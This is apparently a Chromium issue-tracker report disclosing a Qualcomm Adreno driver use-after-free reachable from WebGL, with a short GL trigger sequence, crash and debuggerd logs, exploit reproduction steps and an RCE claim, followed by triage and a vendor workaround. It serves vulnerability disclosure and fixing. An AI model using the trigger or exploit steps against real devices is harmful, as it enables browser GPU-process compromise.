# Qualcomm Wild exploited CVE-2025-27038 bypass

| Field | Value |
|-------|-------|
| **Issue ID** | [493747593](https://issues.chromium.org/issues/493747593) |
| **Status** | New |
| **Severity** | S4-Minimal |
| **Priority** | P0 |
| **Component** | Blink>WebGL |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | ha...@gmail.com |
| **Assignee** | kb...@google.com |
| **Created** | 2026-03-18 |
| **Bounty** | $250,000.00 |

## Description

Security Bug

Important: Please do not change the component of this bug manually.

Please READ THIS FAQ before filing a bug: <https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md>

Please see the following link for instructions on filing security bugs: <https://www.chromium.org/Home/chromium-security/reporting-security-bugs>

Reports may be eligible for reward payments under the Chrome VRP: <https://g.co/chrome/vrp>

NOTE: Security bugs are normally made public once a fix has been widely deployed.

---

VULNERABILITY DETAILS
Bypassing this vulnerability using Gemini: <https://issues.chromium.org/issues/402078335>
The key code are below:

```
    GLuint q[5];
    glGenQueries(5, q);
    glBeginQuery(GL_ANY_SAMPLES_PASSED, q[4]);
    glFenceSync(GL_SYNC_GPU_COMMANDS_COMPLETE, 0);
    glEndQuery(GL_ANY_SAMPLES_PASSED);
    glDeleteQueries(5, q);


```

If remove this,can't reproduce on s25.

VERSION

Chrome Version: [148.0.7735.0] + [build]

Operating System:
samsung/pa1qzcx/pa1q:16/BP2A.250605.031.A3/S9310ZCS9BZB2\_CHC9BZB2:user/release-keys
Android patch level 05/02/2026

build chrome with commit f1107e1bd074b7f871dc4f6542cb9070cd2d7387

open with qualcomm.html

```
signal 6 (SIGABRT), code -1 (SI_QUEUE) in tid 9542 (CrGpuMain), pid 9516 (ileged_process0)
Build fingerprint: 'samsung/pa1qzcx/pa1q:16/BP2A.250605.031.A3/S9310ZCS9BZB2_CHC9BZB2:user/release-keys'
Revision: '11'
pid: 9516, tid: 9542, name: CrGpuMain  >>> org.chromium.chrome:privileged_process0 <<<
signal 6 (SIGABRT), code -1 (SI_QUEUE), fault addr --------
Abort message: 'Scudo ERROR: invalid chunk state when deallocating address 0x200007a9e0885f0'

Stack Trace:
  RELADDR   FUNCTION                                                                          FILE:LINE
  000000000007137c  abort+160) (BuildId: 61a049a7ad18156ebc52d8d483539df9                             /apex/com.android.runtime/lib64/bionic/libc.so
  000000000005d26c  scudo::die()+12) (BuildId: 61a049a7ad18156ebc52d8d483539df9                       /apex/com.android.runtime/lib64/bionic/libc.so
  000000000005dcbc  scudo::reportRawError(char const*)+32) (BuildId: 61a049a7ad18156ebc52d8d483539df9  /apex/com.android.runtime/lib64/bionic/libc.so
  000000000005dc30  scudo::ScopedErrorReport::~ScopedErrorReport()+16) (BuildId: 61a049a7ad18156ebc52d8d483539df9  /apex/com.android.runtime/lib64/bionic/libc.so
  000000000005e04c  scudo::reportInvalidChunkState(scudo::AllocatorAction, void*)+120) (BuildId: 61a049a7ad18156ebc52d8d483539df9  /apex/com.android.runtime/lib64/bionic/libc.so
  000000000005f7d8  scudo::Allocator<scudo::AndroidNormalConfig, &scudo_malloc_postinit>::deallocate(void*, scudo::Chunk::Origin, unsigned long, unsigned long)+296) (BuildId: 61a049a7ad18156ebc52d8d483539df9  /apex/com.android.runtime/lib64/bionic/libc.so
  000000000020121c  !!!0000!b5eedfb3a584512f78b9dc44aa9054!e4a2ccdb56!+172) (BuildId: 02d4e5bda5f7509bf3ae03a0a2d87766  /vendor/lib64/egl/libGLESv2_adreno.so
  0000000000204714  !!!0000!d0051afa8fb0bb02a68e169738355f!e4a2ccdb56!+9876) (BuildId: 02d4e5bda5f7509bf3ae03a0a2d87766  /vendor/lib64/egl/libGLESv2_adreno.so
  0000000000201f90  !!!0000!4c55ad62eeadde03d2e8ada46b4156!e4a2ccdb56!+48) (BuildId: 02d4e5bda5f7509bf3ae03a0a2d87766  /vendor/lib64/egl/libGLESv2_adreno.so
  000000000311e24c  rx::RendererGL::flush()                                                           ../../third_party/angle/src/libANGLE/renderer/gl/RendererGL.cpp:228:5
  0000000007a647dc  GL_Flush                                                                          ../../third_party/angle/src/libGLESv2/entry_points_gles_2_0_autogen.cpp:2018:22
  0000000009032884  gpu::gles2::GLES2DecoderPassthroughImpl::DoFlush()                                ../../gpu/command_buffer/service/gles2_cmd_decoder_passthrough_doers.cc:1224:10
  0000000009027b84  gpu::error::Error gpu::gles2::GLES2DecoderPassthroughImpl::DoCommandsImpl<false>(unsigned int, void const volatile*, int, int*)  ../../gpu/command_buffer/service/gles2_cmd_decoder_passthrough.cc:742:20
  0000000003cf51a4  gpu::CommandBufferService::Flush(int, gpu::AsyncAPIInterface*)                    ../../gpu/command_buffer/service/command_buffer_service.cc:267:35
  00000000090e9540  gpu::CommandBufferStub::OnAsyncFlush(int, unsigned int, std::__Cr::vector<gpu::SyncToken, std::__Cr::allocator<gpu::SyncToken>> const&)  ../../gpu/ipc/service/command_buffer_stub.cc:504:22
  00000000090e9284  gpu::CommandBufferStub::ExecuteDeferredRequest(gpu::mojom::DeferredCommandBufferRequestParams&, gpu::FenceSyncReleaseDelegate*)  ../../gpu/ipc/service/command_buffer_stub.cc:173:7
  00000000090eec54  gpu::GpuChannel::ExecuteDeferredRequest(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*)  ../../gpu/ipc/service/gpu_channel.cc:833:13
  v------>  void base::internal::DecayedFunctorTraits<void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>&&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&>::Invoke<void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel> const&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*>(void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel> const&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&, gpu::FenceSyncReleaseDelegate*&&)  ../../base/functional/bind_internal.h:740:12
  v------>  void base::internal::InvokeHelper<true, base::internal::FunctorTraits<void (gpu::GpuChannel::*&&)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>&&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&>, void, 0ul, 1ul>::MakeItSo<void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), std::__Cr::tuple<base::WeakPtr<gpu::GpuChannel>, mojo::StructPtr<gpu::mojom::DeferredRequestParams>>, gpu::FenceSyncReleaseDelegate*>(void (gpu::GpuChannel::*&&)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), std::__Cr::tuple<base::WeakPtr<gpu::GpuChannel>, mojo::StructPtr<gpu::mojom::DeferredRequestParams>>&&, gpu::FenceSyncReleaseDelegate*&&)  ../../base/functional/bind_internal.h:956:5
  v------>  void base::internal::Invoker<base::internal::FunctorTraits<void (gpu::GpuChannel::*&&)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>&&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&>, base::internal::BindState<true, true, false, void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>, mojo::StructPtr<gpu::mojom::DeferredRequestParams>>, void (gpu::FenceSyncReleaseDelegate*)>::RunImpl<void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), std::__Cr::tuple<base::WeakPtr<gpu::GpuChannel>, mojo::StructPtr<gpu::mojom::DeferredRequestParams>>, 0ul, 1ul>(void (gpu::GpuChannel::*&&)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), std::__Cr::tuple<base::WeakPtr<gpu::GpuChannel>, mojo::StructPtr<gpu::mojom::DeferredRequestParams>>&&, std::__Cr::integer_sequence<unsigned long, 0ul, 1ul>, gpu::FenceSyncReleaseDelegate*&&)  ../../base/functional/bind_internal.h:1069:14
  00000000090f1714  base::internal::Invoker<base::internal::FunctorTraits<void (gpu::GpuChannel::*&&)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>&&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&>, base::internal::BindState<true, true, false, void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>, mojo::StructPtr<gpu::mojom::DeferredRequestParams>>, void (gpu::FenceSyncReleaseDelegate*)>::RunOnce(base::internal::BindStateBase*, gpu::FenceSyncReleaseDelegate*)  ../../base/functional/bind_internal.h:982:12
  v------>  base::OnceCallback<void (media::DemuxerStream*)>::Run(media::DemuxerStream*) &&   ../../base/functional/callback.h:155:12
  v------>  void base::internal::DecayedFunctorTraits<base::OnceCallback<void (media::DemuxerStream*)>, media::DemuxerStream*&&>::Invoke<base::OnceCallback<void (media::DemuxerStream*)>, media::DemuxerStream*>(base::OnceCallback<void (media::DemuxerStream*)>&&, media::DemuxerStream*&&)  ../../base/functional/bind_internal.h:815:49
  v------>  void base::internal::InvokeHelper<false, base::internal::FunctorTraits<base::OnceCallback<void (media::DemuxerStream*)>&&, media::DemuxerStream*&&>, void, 0ul>::MakeItSo<base::OnceCallback<void (media::DemuxerStream*)>, std::__Cr::tuple<base::internal::UnretainedWrapper<media::DemuxerStream, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>>(base::OnceCallback<void (media::DemuxerStream*)>&&, std::__Cr::tuple<base::internal::UnretainedWrapper<media::DemuxerStream, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>&&)  ../../base/functional/bind_internal.h:932:12
  v------>  void base::internal::Invoker<base::internal::FunctorTraits<base::OnceCallback<void (media::DemuxerStream*)>&&, media::DemuxerStream*&&>, base::internal::BindState<false, true, true, base::OnceCallback<void (media::DemuxerStream*)>, base::internal::UnretainedWrapper<media::DemuxerStream, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, void ()>::RunImpl<base::OnceCallback<void (media::DemuxerStream*)>, std::__Cr::tuple<base::internal::UnretainedWrapper<media::DemuxerStream, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, 0ul>(base::OnceCallback<void (media::DemuxerStream*)>&&, std::__Cr::tuple<base::internal::UnretainedWrapper<media::DemuxerStream, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>&&, std::__Cr::integer_sequence<unsigned long, 0ul>)  ../../base/functional/bind_internal.h:1069:14
  000000000364588c  base::internal::Invoker<base::internal::FunctorTraits<base::OnceCallback<void (BrowserWindowInterface*)>&&, base::raw_ptr<BrowserWindowInterface, (partition_alloc::internal::RawPtrTraits)1>&&>, base::internal::BindState<false, true, true, base::OnceCallback<void (BrowserWindowInterface*)>, base::internal::UnretainedWrapper<BrowserWindowInterface, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)1>>, void ()>::RunOnce(base::internal::BindStateBase*)  ../../base/functional/bind_internal.h:982:12
  v------>  base::OnceCallback<void ()>::Run() &&                                             ../../base/functional/callback.h:155:12
  0000000003cfa4b8  gpu::Scheduler::ExecuteSequence(base::IdType<gpu::SyncPointOrderData, unsigned int, 0u, 1u>)  ../../gpu/command_buffer/service/scheduler.cc:707:29
  0000000003cf9cb8  gpu::Scheduler::RunNextTask()                                                     ../../gpu/command_buffer/service/scheduler.cc:625:3
  v------>  base::OnceCallback<void ()>::Run() &&                                             ../../base/functional/callback.h:155:12
  00000000067bce40  base::TaskAnnotator::RunTaskImpl(base::PendingTask&)                              ../../base/task/common/task_annotator.cc:229:34
  v------>  void base::TaskAnnotator::RunTask<base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*)::$_3>(perfetto::StaticString, base::PendingTask&, base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*)::$_3&&)  ../../base/task/common/task_annotator.h:112:5
  00000000067d7174  base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*)  ../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:475:23
  00000000067d6d90  base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork()   ../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:346:40
  000000000677330c  base::MessagePumpDefault::Run(base::MessagePump::Delegate*)                       ../../base/message_loop/message_pump_default.cc:42:55
  00000000067d778c  base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta)  ../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:650:12
  000000000679e314  base::RunLoop::Run(base::Location const&)                                         ../../base/run_loop.cc:135:14
  000000000c119ba0  content::GpuMain(content::MainFunctionParams)                                     ../../content/gpu/gpu_main.cc:479:14
  000000000674e9ac  content::RunOtherNamedProcessTypeMain(std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&, content::MainFunctionParams, content::ContentMainDelegate*)  ../../content/app/content_main_runner_impl.cc:762:14
  000000000674f84c  content::ContentMainRunnerImpl::Run()                                             ../../content/app/content_main_runner_impl.cc:1152:10
  000000000674d3c0  content::RunContentProcess(content::ContentMainParams, content::ContentMainRunner*)  ../../content/app/content_main.cc:358:36
  000000000674e334  content::StartContentMain(bool)                                                   ../../content/app/android/content_main_android.cc:54:10
  00000000002d66bc  art_jni_trampoline+108) (BuildId: 1dfca4cf5b8b42c8355c90c8df5ea0c828c6d4b5        /system/framework/arm64/boot.oat
  0000000000689408  nterp_helper+152) (BuildId: eb4ec0f1d1c7267591d83fa87cb36390                      /apex/com.android.art/lib64/libart.so
  000000000028d32a  offset 0x1eff000) (vh1.run+570                                                    /data/app/~~ZSiUhW9gIcmH2RPb76mnYA==/org.chromium.chrome-whViy_L9On5doNx0pGvt9g==/base.apk/libmonochrome.so
  00000000000a9500  java.lang.Thread.run+64) (BuildId: 1dfca4cf5b8b42c8355c90c8df5ea0c828c6d4b5       /system/framework/arm64/boot.oat
  0000000000317194  art_quick_invoke_stub+612) (BuildId: eb4ec0f1d1c7267591d83fa87cb36390             /apex/com.android.art/lib64/libart.so
  0000000000302838  art::ArtMethod::Invoke(art::Thread*, unsigned int*, unsigned int, art::JValue*, char const*)+216) (BuildId: eb4ec0f1d1c7267591d83fa87cb36390  /apex/com.android.art/lib64/libart.so
  00000000004c8298  art::Thread::CreateCallback(void*)+932) (BuildId: eb4ec0f1d1c7267591d83fa87cb36390  /apex/com.android.art/lib64/libart.so
  00000000004c7ee4  art::Thread::CreateCallbackWithUffdGc(void*)+8) (BuildId: eb4ec0f1d1c7267591d83fa87cb36390  /apex/com.android.art/lib64/libart.so
  0000000000082740  __pthread_start(void*)+184) (BuildId: 61a049a7ad18156ebc52d8d483539df9            /apex/com.android.runtime/lib64/bionic/libc.so
  0000000000074b98  __start_thread+68) (BuildId: 61a049a7ad18156ebc52d8d483539df9                     /apex/com.android.runtime/lib64/bionic/libc.so


```

Exploit reproduce environment

1.local test build with adreno\_exp.cpp

2.adb shell and logcat -s LOG

Exploit from chromium
1.patch renderer with adreno\_exp.h like issue <https://issues.chromium.org/issues/402078335>
2.run exp.html
3.logcat | grep DEBUG

```
 DEBUG   : *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
 DEBUG   : Build fingerprint: 'samsung/pa1qzcx/pa1q:16/BP2A.250605.031.A3/S9310ZCS9BZB2_CHC9BZB2:user/release-keys'
 DEBUG   : Revision: '11'
 DEBUG   : ABI: 'arm64'
 DEBUG   : Processor: '7'
 DEBUG   : Timestamp: 2026-03-18 09:02:27.979595759+0800
 DEBUG   : Process uptime: 14s
 DEBUG   : Cmdline: org.chromium.chrome:privileged_process0
 DEBUG   : pid: 7678, tid: 7723, name: CrGpuMain  >>> org.chromium.chrome:privileged_process0 <<<
 DEBUG   : uid: 10366
 DEBUG   : tagged_addr_ctrl: 0000000000000001 (PR_TAGGED_ADDR_ENABLE)
 DEBUG   : pac_enabled_keys: 000000000000000f (PR_PAC_APIAKEY, PR_PAC_APIBKEY, PR_PAC_APDAKEY, PR_PAC_APDBKEY)
 DEBUG   : signal 5 (SIGTRAP), code -6 (SI_TKILL), fault addr --------
 DEBUG   :     x0  0000000000000000  x1  0000000000001e2b  x2  0000000000000005  x3  0000000000000040
 DEBUG   :     x4  000000000000003f  x5  000000000000003f  x6  000000000000003f  x7  0000000000000000
 DEBUG   :     x8  0000000000000083  x9  0000000000000005  x10 0000007c1c90e8dc  x11 0000000000000001
 DEBUG   :     x12 00000000400c0907  x13 0000007916e2e140  x14 0000000000010c20  x15 0000000000000002
 DEBUG   :     x16 0000007c1c977760  x17 0000007c1c95e5c0  x18 000000783fc90000  x19 b400007a9e0a7d30
 DEBUG   :     x20 0000000000000000  x21 b4000079ee08bf00  x22 b400007b3e0942d0  x23 b4000079be1000a0
 DEBUG   :     x24 b400007a9e0a7d30  x25 b400007b3e094db0  x26 b4000079be1000a0  x27 0000000000000000
 DEBUG   :     x28 0000000000000001  x29 00000078c141ad30
 DEBUG   :     lr  0000007828813408  sp  00000078c141ad00  pc  0000007c1c95e5cc  pst 0000000000001000
 DEBUG   : 40 total frames
 DEBUG   : backtrace:
 DEBUG   :       #00 pc 00000000000d65cc  /apex/com.android.runtime/lib64/bionic/libc.so (tgkill+12) (BuildId: 61a049a7ad18156ebc52d8d483539df9)
 DEBUG   :       #01 pc 0000000000201404  /vendor/lib64/egl/libGLESv2_adreno.so (!!!0000!b5eedfb3a584512f78b9dc44aa9054!e4a2ccdb56!+660) (BuildId: 02d4e5bda5f7509bf3ae03a0a2d87766)
 DEBUG   :       #02 pc 0000000000204714  /vendor/lib64/egl/libGLESv2_adreno.so (!!!0000!d0051afa8fb0bb02a68e169738355f!e4a2ccdb56!+9876) (BuildId: 02d4e5bda5f7509bf3ae03a0a2d87766)
 DEBUG   :       #03 pc 00000000003e7720  /vendor/lib64/egl/libGLESv2_adreno.so (!!!0000!12c70bdeaedf524ea417d15cbe14db!e4a2ccdb56!+288) (BuildId: 02d4e5bda5f7509bf3ae03a0a2d87766)
 DEBUG   :       #04 pc 00000000004686e0  /vendor/lib64/egl/libGLESv2_adreno.so (!!!0000!5ca735cd4b25fc7485be678c9f7288!e4a2ccdb56!+80) (BuildId: 02d4e5bda5f7509bf3ae03a0a2d87766)
 DEBUG   :       #05 pc 00000000003f1f80  /vendor/lib64/egl/libGLESv2_adreno.so (!!!0000!6a1372f3b46c5fb5f8486087eaf6ca!e4a2ccdb56!+192) (BuildId: 02d4e5bda5f7509bf3ae03a0a2d87766)
 DEBUG   :       #06 pc 0000000003128940  /data/app/~~TJ1JDtl_iim255ySo4K1rA==/org.chromium.chrome-GzGuhF5li71iTBFVT53Efw==/lib/arm64/libchrome.so (BuildId: 9cc645f585dbe72521a26d12a85a7c8951bfb025)
 DEBUG   :       #07 pc 0000000003004940  /data/app/~~TJ1JDtl_iim255ySo4K1rA==/org.chromium.chrome-GzGuhF5li71iTBFVT53Efw==/lib/arm64/libchrome.so (BuildId: 9cc645f585dbe72521a26d12a85a7c8951bfb025)
 DEBUG   :       #08 pc 0000000002fec49c  /data/app/~~TJ1JDtl_iim255ySo4K1rA==/org.chromium.chrome-GzGuhF5li71iTBFVT53Efw==/lib/arm64/libchrome.so (BuildId: 9cc645f585dbe72521a26d12a85a7c8951bfb025)
 DEBUG   :       #09 pc 00000000090326d8  /data/app/~~TJ1JDtl_iim255ySo4K1rA==/org.chromium.chrome-GzGuhF5li71iTBFVT53Efw==/lib/arm64/libchrome.so (BuildId: 9cc645f585dbe72521a26d12a85a7c8951bfb025)
 DEBUG   :       #10 pc 0000000009027b84  /data/app/~~TJ1JDtl_iim255ySo4K1rA==/org.chromium.chrome-GzGuhF5li71iTBFVT53Efw==/lib/arm64/libchrome.so (BuildId: 9cc645f585dbe72521a26d12a85a7c8951bfb025)
 DEBUG   :       #11 pc 0000000003cf51a4  /data/app/~~TJ1JDtl_iim255ySo4K1rA==/org.chromium.chrome-GzGuhF5li71iTBFVT53Efw==/lib/arm64/libchrome.so (BuildId: 9cc645f585dbe72521a26d12a85a7c8951bfb025)
 DEBUG   :       #12 pc 00000000090e9540  /data/app/~~TJ1JDtl_iim255ySo4K1rA==/org.chromium.chrome-GzGuhF5li71iTBFVT53Efw==/lib/arm64/libchrome.so (BuildId: 9cc645f585dbe72521a26d12a85a7c8951bfb025)
 DEBUG   :       #13 pc 00000000090e9284  /data/app/~~TJ1JDtl_iim255ySo4K1rA==/org.chromium.chrome-GzGuhF5li71iTBFVT53Efw==/lib/arm64/libchrome.so (BuildId: 9cc645f585dbe72521a26d12a85a7c8951bfb025)
 DEBUG   :       #14 pc 00000000090eec54  /data/app/~~TJ1JDtl_iim255ySo4K1rA==/org.chromium.chrome-GzGuhF5li71iTBFVT53Efw==/lib/arm64/libchrome.so (BuildId: 9cc645f585dbe72521a26d12a85a7c8951bfb025)
 DEBUG   :       #15 pc 00000000090f1714  /data/app/~~TJ1JDtl_iim255ySo4K1rA==/org.chromium.chrome-GzGuhF5li71iTBFVT53Efw==/lib/arm64/libchrome.so (BuildId: 9cc645f585dbe72521a26d12a85a7c8951bfb025)
 DEBUG   :       #16 pc 000000000364588c  /data/app/~~TJ1JDtl_iim255ySo4K1rA==/org.chromium.chrome-GzGuhF5li71iTBFVT53Efw==/lib/arm64/libchrome.so (BuildId: 9cc645f585dbe72521a26d12a85a7c8951bfb025)
 DEBUG   :       #17 pc 0000000003cfa4b8  /data/app/~~TJ1JDtl_iim255ySo4K1rA==/org.chromium.chrome-GzGuhF5li71iTBFVT53Efw==/lib/arm64/libchrome.so (BuildId: 9cc645f585dbe72521a26d12a85a7c8951bfb025)
 DEBUG   :       #18 pc 0000000003cf9cb8  /data/app/~~TJ1JDtl_iim255ySo4K1rA==/org.chromium.chrome-GzGuhF5li71iTBFVT53Efw==/lib/arm64/libchrome.so (BuildId: 9cc645f585dbe72521a26d12a85a7c8951bfb025)
 DEBUG   :       #19 pc 00000000067bce40  /data/app/~~TJ1JDtl_iim255ySo4K1rA==/org.chromium.chrome-GzGuhF5li71iTBFVT53Efw==/lib/arm64/libchrome.so (BuildId: 9cc645f585dbe72521a26d12a85a7c8951bfb025)
 DEBUG   :       #20 pc 00000000067d7174  /data/app/~~TJ1JDtl_iim255ySo4K1rA==/org.chromium.chrome-GzGuhF5li71iTBFVT53Efw==/lib/arm64/libchrome.so (BuildId: 9cc645f585dbe72521a26d12a85a7c8951bfb025)
 DEBUG   :       #21 pc 00000000067d6d90  /data/app/~~TJ1JDtl_iim255ySo4K1rA==/org.chromium.chrome-GzGuhF5li71iTBFVT53Efw==/lib/arm64/libchrome.so (BuildId: 9cc645f585dbe72521a26d12a85a7c8951bfb025)
 DEBUG   :       #22 pc 000000000677330c  /data/app/~~TJ1JDtl_iim255ySo4K1rA==/org.chromium.chrome-GzGuhF5li71iTBFVT53Efw==/lib/arm64/libchrome.so (BuildId: 9cc645f585dbe72521a26d12a85a7c8951bfb025)
 DEBUG   :       #23 pc 00000000067d778c  /data/app/~~TJ1JDtl_iim255ySo4K1rA==/org.chromium.chrome-GzGuhF5li71iTBFVT53Efw==/lib/arm64/libchrome.so (BuildId: 9cc645f585dbe72521a26d12a85a7c8951bfb025)
 DEBUG   :       #24 pc 000000000679e314  /data/app/~~TJ1JDtl_iim255ySo4K1rA==/org.chromium.chrome-GzGuhF5li71iTBFVT53Efw==/lib/arm64/libchrome.so (BuildId: 9cc645f585dbe72521a26d12a85a7c8951bfb025)
 DEBUG   :       #25 pc 000000000c119ad4  /data/app/~~TJ1JDtl_iim255ySo4K1rA==/org.chromium.chrome-GzGuhF5li71iTBFVT53Efw==/lib/arm64/libchrome.so (BuildId: 9cc645f585dbe72521a26d12a85a7c8951bfb025)
 DEBUG   :       #26 pc 000000000674e9ac  /data/app/~~TJ1JDtl_iim255ySo4K1rA==/org.chromium.chrome-GzGuhF5li71iTBFVT53Efw==/lib/arm64/libchrome.so (BuildId: 9cc645f585dbe72521a26d12a85a7c8951bfb025)
 DEBUG   :       #27 pc 000000000674f84c  /data/app/~~TJ1JDtl_iim255ySo4K1rA==/org.chromium.chrome-GzGuhF5li71iTBFVT53Efw==/lib/arm64/libchrome.so (BuildId: 9cc645f585dbe72521a26d12a85a7c8951bfb025)
 DEBUG   :       #28 pc 000000000674d3c0  /data/app/~~TJ1JDtl_iim255ySo4K1rA==/org.chromium.chrome-GzGuhF5li71iTBFVT53Efw==/lib/arm64/libchrome.so (BuildId: 9cc645f585dbe72521a26d12a85a7c8951bfb025)
 DEBUG   :       #29 pc 000000000674e334  /data/app/~~TJ1JDtl_iim255ySo4K1rA==/org.chromium.chrome-GzGuhF5li71iTBFVT53Efw==/lib/arm64/libchrome.so (BuildId: 9cc645f585dbe72521a26d12a85a7c8951bfb025)
 DEBUG   :       #30 pc 00000000002d66bc  /system/framework/arm64/boot.oat (art_jni_trampoline+108) (BuildId: 1dfca4cf5b8b42c8355c90c8df5ea0c828c6d4b5)
 DEBUG   :       #31 pc 0000000000689408  /apex/com.android.art/lib64/libart.so (nterp_helper+152) (BuildId: eb4ec0f1d1c7267591d83fa87cb36390)
 DEBUG   :       #32 pc 000000000028d32a  /data/app/~~TJ1JDtl_iim255ySo4K1rA==/org.chromium.chrome-GzGuhF5li71iTBFVT53Efw==/base.apk (offset 0x1eff000) (vh1.run+570)
 DEBUG   :       #33 pc 00000000000a9500  /system/framework/arm64/boot.oat (java.lang.Thread.run+64) (BuildId: 1dfca4cf5b8b42c8355c90c8df5ea0c828c6d4b5)
 DEBUG   :       #34 pc 0000000000317194  /apex/com.android.art/lib64/libart.so (art_quick_invoke_stub+612) (BuildId: eb4ec0f1d1c7267591d83fa87cb36390)
 DEBUG   :       #35 pc 0000000000302838  /apex/com.android.art/lib64/libart.so (art::ArtMethod::Invoke(art::Thread*, unsigned int*, unsigned int, art::JValue*, char const*)+216) (BuildId: eb4ec0f1d1c7267591d83fa87cb36390)
 DEBUG   :       #36 pc 00000000004c8298  /apex/com.android.art/lib64/libart.so (art::Thread::CreateCallback(void*)+932) (BuildId: eb4ec0f1d1c7267591d83fa87cb36390)
 DEBUG   :       #37 pc 00000000004c7ee4  /apex/com.android.art/lib64/libart.so (art::Thread::CreateCallbackWithUffdGc(void*)+8) (BuildId: eb4ec0f1d1c7267591d83fa87cb36390)
 DEBUG   :       #38 pc 0000000000082740  /apex/com.android.runtime/lib64/bionic/libc.so (__pthread_start(void*)+184) (BuildId: 61a049a7ad18156ebc52d8d483539df9)
 DEBUG   :       #39 pc 0000000000074b98  /apex/com.android.runtime/lib64/bionic/libc.so (__start_thread+68) (BuildId: 61a049a7ad18156ebc52d8d483539df9)


```

To prove that this is a demonstration of RCE, I used raise(5) in my gadget because I found that executing system in Chrome requires using ROP, and the GPU address and CPU address are not shared. For the sake of simplicity, I used raise. After successfully executing this shellcode, you can see that the final crash log is tgkill.

CREDIT INFORMATION

Reporter credit: happy2me

## Attachments

- [qualcomm.html](attachments/qualcomm.html) (text/html, 11.6 KB)
- [adreno_exp.cpp](attachments/adreno_exp.cpp) (text/x-c++src, 7.9 KB)
- deleted (application/octet-stream, 0 B)
- [exp.html](attachments/exp.html) (text/html, 201 B)
- deleted (application/octet-stream, 0 B)
- deleted (application/octet-stream, 0 B)
- [img_exp.h](attachments/img_exp.h) (text/x-chdr, 9.9 KB)
- exploit_s25.mp4 (video/mp4, 14.3 MB)
- [patchs25.diff](attachments/patchs25.diff) (text/x-diff, 11.3 KB)

## Timeline

### ha...@gmail.com (2026-03-18)

deleted

### ts...@google.com (2026-03-18)

Sorry, but you'll need to attach a symbolized ASAN stack trace in order for us to accept such reports.

### ha...@gmail.com (2026-03-18)

Are you serious? Did you even read the report properly? This is a driver issue; there's no ASAN stack.

### aj...@chromium.org (2026-03-18)

reopening - this indeed contains a symbolized stack (as well as some unsymbolized stacks) and cannot be asan as the bug is in 3p driver code.

### ts...@google.com (2026-03-18)

Setting provisional found-in to extended stable.

### ch...@google.com (2026-03-19)

Setting milestone because of s0/s1 severity.

### ha...@gmail.com (2026-03-28)

Hi,Any update?This should be handled by Qualcomm developer for fixing. Please refer to <https://issues.chromium.org/issues/475998143>

### kb...@chromium.org (2026-03-31)

Sorry, we need more people than just me looking at these bugs.

Mukesh - can you please see whether you can reproduce this report in-house? If you can find a root cause, then can you suggest a potential workaround we can do in Chromium or ANGLE?

### pm...@qti.qualcomm.com (2026-04-01)

Thanks for reporting this. I’ll review it and update soon

### pm...@qti.qualcomm.com (2026-04-13)

Thanks for reporting this issue. We have identified the root cause, and a fix has been implemented for our upcoming chipsets.

For older targets, we recommend the following workaround. 
The issue is related to FBO memory management, which can lead to a dangling pointer in this specific scenario. As a mitigation, the previously bound FBO should be deleted after each flush and then recreated along with its attachments.

Specifically, adding the following code immediately after
const sync = gl.fenceSync(gl.SYNC_GPU_COMMANDS_COMPLETE, 0);
in the provided qualcomm.html file resolves the observed crash.

